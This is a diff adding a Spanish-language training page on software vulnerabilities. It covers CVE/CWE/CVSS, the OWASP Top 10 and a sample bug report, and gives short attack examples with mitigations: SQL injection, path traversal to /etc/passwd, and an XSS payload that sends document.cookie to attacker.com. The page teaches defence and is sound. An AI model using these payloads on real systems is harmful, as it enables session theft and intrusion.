@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>06 — Vulnerabilidades | CDPN</title>
+<link rel="icon" type="image/svg+xml" href="../../favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="../../assets/icons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="../../assets/icons/favicon-16x16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="../../assets/icons/apple-touch-icon.png">
+<link rel="manifest" href="../../manifest.webmanifest">
+<meta name="description" content="Vulnerabilidades: CVE, CWE, CVSS, OWASP Top 10, ejemplos comunes (SQLi, XSS, SSRF, IDOR, path traversal) y reporte profesional.">
+<meta name="theme-color" content="#0a0e1a">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://0xvanguard.github.io/CyberDefense-Pro-Network/modules/fundamentos/06-vulnerabilidades.html">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/css/global.css">
+<link rel="stylesheet" href="../../assets/css/module.css">
+<link rel="stylesheet" href="../../assets/css/a11y.css">
+</head>
+<body>
+<a href="#main" class="skip-link">Saltar al contenido principal</a>
+
+<nav class="navbar" role="navigation" aria-label="Navegación principal">
+<div class="nav-container">
+<a href="../../index.html" class="nav-logo"><i class="fas fa-shield-halved"></i> CDPN</a>
+<button class="nav-toggle" id="navToggle" aria-label="Abrir menú" aria-expanded="false"><i class="fas fa-bars" aria-hidden="true"></i></button>
+<ul class="nav-menu" id="navMenu">
+<li><a href="../../index.html">Inicio</a></li>
+<li><a href="../introduccion/">Introducción</a></li>
+<li><a href="../red-team/">Red Team</a></li>
+<li><a href="../blue-team/">Blue Team</a></li>
+<li><a href="../purple-team/">Purple Team</a></li>
+<li><a href="../ai-agents/">AI Security</a></li>
+<li><a href="../laboratorios/">Labs</a></li>
+<li><a href="../recursos/">Recursos</a></li>
+<li><a href="index.html"><strong>Fundamentos</strong></a></li>
+</ul>
+<div class="nav-actions">
+<div class="lang-switcher" id="langSwitcher">
+<button class="lang-btn" id="langBtn" aria-label="Cambiar idioma" aria-haspopup="true" aria-expanded="false">
+  <i class="fas fa-globe" aria-hidden="true"></i> <span id="langLabel">ES</span>
+</button>
+<div class="lang-dropdown" id="langDropdown" role="menu">
+  <button class="lang-option" data-lang="es" role="menuitem">Español</button>
+  <button class="lang-option" data-lang="en" role="menuitem">English</button>
+</div>
+</div>
+<a href="https://github.com/0xvanguard/CyberDefense-Pro-Network" class="nav-github" target="_blank" rel="noopener"><i class="fab fa-github"></i></a>
+</div>
+</div>
+</nav>
+
+<main id="main">
+<div class="breadcrumb">
+  <a href="../../index.html">CDPN</a><span>/</span>
+  <a href="index.html">Fundamentos</a><span>/</span>
+  <span>06 — Vulnerabilidades</span>
+</div>
+
+<section class="module-hero" style="--hero-glow: rgba(46, 204, 113, 0.10);">
+  <div class="module-hero-content">
+    <h1>06 — <span class="gradient-text">Vulnerabilidades</span></h1>
+    <p>Qué son, cómo se clasifican (CVE/CWE/CVSS), OWASP Top 10 y ejemplos clásicos.</p>
+  </div>
+</section>
+
+<div class="content-block">
+  <h3><i class="fas fa-bug"></i> 1. ¿Qué es una vulnerabilidad?</h3>
+  <p>Una <strong>vulnerabilidad</strong> es una debilidad en un sistema que un atacante puede explotar.</p>
+  <p><strong>Tres ingredientes</strong> para que haya problema:</p>
+  <ol>
+    <li>Una debilidad (bug, mala configuración, defecto de diseño).</li>
+    <li>Un atacante que la conoce.</li>
+    <li>Un activo que la organización quiere proteger.</li>
+  </ol>
+</div>
+
+<div class="content-block">
+  <h3><i class="fas fa-tag"></i> 2. CVE, CWE y CVSS</h3>
+  <div class="info-grid">
+    <div class="info-col" style="border-top: 3px solid #3498db;">
+      <h4>CVE — la "matrícula"</h4>
+      <p>ID único asignado por MITRE: <code>CVE-AAAA-NNNN</code>.</p>
+      <p>Ej: <code>CVE-2017-0144</code> (EternalBlue, WannaCry).</p>
+    </div>
+    <div class="info-col" style="border-top: 3px solid #f39c12;">
+      <h4>CWE — la "familia"</h4>
+      <p>Categoría de debilidad (la "raíz" del problema).</p>
+      <p>Ej: <strong>CWE-79</strong> (XSS), <strong>CWE-89</strong> (SQLi), <strong>CWE-798</strong> (credenciales hardcoded).</p>
+    </div>
+    <div class="info-col" style="border-top: 3px solid #e74c3c;">
+      <h4>CVSS — la "gravedad"</h4>
+      <p>Sistema 0–10. <strong>CVSS 3.1</strong> actual.</p>
+      <p>Categorías: None / Low / Medium / High / Critical.</p>
+    </div>
+  </div>
+</div>
+
+<div class="content-block">
+  <h3><i class="fas fa-list-ol"></i> 3. OWASP Top 10 (web, edición 2021)</h3>
+  <ol>
+    <li><strong>A01 Broken Access Control</strong> — el clásico: un usuario hace cosas que no debería.</li>
+    <li><strong>A02 Cryptographic Failures</strong> — datos sin cifrar, mal hashing.</li>
+    <li><strong>A03 Injection</strong> — SQLi, NoSQLi, command injection.</li>
+    <li><strong>A04 Insecure Design</strong> — fallas de diseño, no de código.</li>
+    <li><strong>A05 Security Misconfiguration</strong> — defaults inseguros, paneles admin abiertos.</li>
+    <li><strong>A06 Vulnerable &amp; Outdated Components</strong> — dependencias sin parchear.</li>
+    <li><strong>A07 Identification &amp; Authentication Failures</strong> — login roto, sin MFA.</li>
+    <li><strong>A08 Software &amp; Data Integrity Failures</strong> — actualizaciones sin verificar, CI/CD inseguro.</li>
+    <li><strong>A09 Security Logging &amp; Monitoring Failures</strong> — ataques que nadie ve.</li>
+    <li><strong>A10 Server-Side Request Forgery (SSRF)</strong> — el servidor hace peticiones internas a tu nombre.</li>
+  </ol>
+</div>
+
+<div class="content-block">
+  <h3><i class="fas fa-crosshairs"></i> 4. Vulnerabilidades comunes que verás 1000 veces</h3>
+
+  <h4>SQL Injection (SQLi)</h4>
+<pre><code>SELECT * FROM users WHERE username='admin' AND password='lo_que_meta';
+
+-- Si input es ' OR '1'='1:
+SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1';
+-- → loguea como admin sin conocer la contraseña.</code></pre>
+  <p><strong>Mitigación:</strong> consultas preparadas, ORM, menos privilegios al usuario de DB.</p>
+
+  <h4>XSS (Cross-Site Scripting)</h4>
+<pre><code>&lt;!-- Input --&gt;
+&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</code></pre>
+  <p>Variantes: stored, reflected, DOM-based. <strong>Mitigación:</strong> escapar output, CSP headers, sanitización.</p>
+
+  <h4>SSRF</h4>
+<pre><code>GET /api/fetch?url=http://localhost:8080/admin</code></pre>
+
+  <h4>IDOR</h4>
+<pre><code>GET /api/users/123/profile   # yo soy el 123
+GET /api/users/124/profile   # veamos el de otro sin permiso</code></pre>
+  <p><strong>IDOR</strong> = Insecure Direct Object Reference. Falla de control de acceso.</p>
+
+  <h4>Path Traversal</h4>
+<pre><code>GET /download?file=../../../../etc/passwd</code></pre>
+
+  <h4>Hardcoded secrets</h4>
+<pre><code># 😱
+API_KEY = "sk-1234567890abcdef"</code></pre>
+  <div class="info-box" style="border-left-color: #e74c3c;">
+    <div class="info-title"><i class="fas fa-exclamation-triangle"></i></div>
+    <p>Bots escanean GitHub 24/7 y avisan al atacante en minutos.</p>
+  </div>
+</div>
+
+<div class="content-block">
+  <h3><i class="fas fa-flag"></i> 5. Cómo escribir un reporte profesional</h3>
+<pre><code># Title
+Stored XSS in profile name field via SVG upload
+
+## Severity
+High (CVSS 7.4)
+
+## Description
+When uploading a profile image in SVG format, the server does
+not sanitize &lt;script&gt; tags inside the SVG XML namespace...
+
+## Steps to Reproduce
+1. Create a profile image in SVG that includes &lt;script&gt;alert(1)&lt;/script&gt;
+2. Upload as profile picture
+3. View another user's profile page that renders my picture
+4. XSS fires in their session
+
+## Impact
+Attacker can hijack any user's session, exfiltrate cookies,
+perform actions on behalf of the user.
+
+## Suggested Fix
+- Serve all user uploads from a separate domain with no cookies
+- Or convert SVG to a safe raster format on upload
+- Add Content-Security-Policy header
+
+## Evidence
+[Attach screenshots / video / HTTP request-response]</code></pre>
+</div>
+
+<div class="content-block" style="margin-top: 3rem;">
+  <div class="info-box" style="border-left-color: #2ecc71;">
+    <div class="info-title"><i class="fas fa-arrow-right"></i> Siguiente paso</div>
+    <p><a href="07-etica-y-leyes.html"><strong>07 — Ética y leyes</strong></a> — los límites que todo profesional debe respetar.</p>
+  </div>
+</div>
+
+</main>
+
+<footer class="footer">
+<div class="footer-content">
+<div class="footer-grid">
+  <div class="footer-col"><h4><i class="fas fa-shield-halved"></i> CDPN</h4><p>Ciberdefensa profesional.</p></div>
+  <div class="footer-col">
+    <h4>Fundamentos</h4>
+    <ul>
+      <li><a href="index.html">Índice</a></li>
+      <li><a href="05-criptografia-basica.html">05 — Cripto</a></li>
+      <li>06 — Vulns</li>
+      <li><a href="07-etica-y-leyes.html">07 — Ética</a></li>
+      <li><a href="08-herramientas-esenciales.html">08 — Tools</a></li>
+    </ul>
+  </div>
+  <div class="footer-col">
+    <h4>Secciones</h4>
+    <ul>
+      <li><a href="../../retos.html">Retos</a></li>
+      <li><a href="../../herramientas.html">Herramientas</a></li>
+      <li><a href="../../labs.html">Labs</a></li>
+      <li><a href="../../recursos.html">Recursos</a></li>
+    </ul>
+  </div>
+  <div class="footer-col">
+    <h4>GitHub</h4>
+    <ul><li><a href="https://github.com/0xvanguard/CyberDefense-Pro-Network"><i class="fab fa-github"></i> Repo</a></li></ul>
+  </div>
+</div>
+<div class="footer-bottom"><p>&copy; 2026 CDPN — CyberDefense Pro Network.</p></div>
+</div>
+</footer>
+
+<script src="../../assets/js/i18n.js"></script>
+<script src="../../assets/js/i18n-lang.js"></script>
+<script src="../../assets/js/shared.js"></script>
+</body>
+</html>
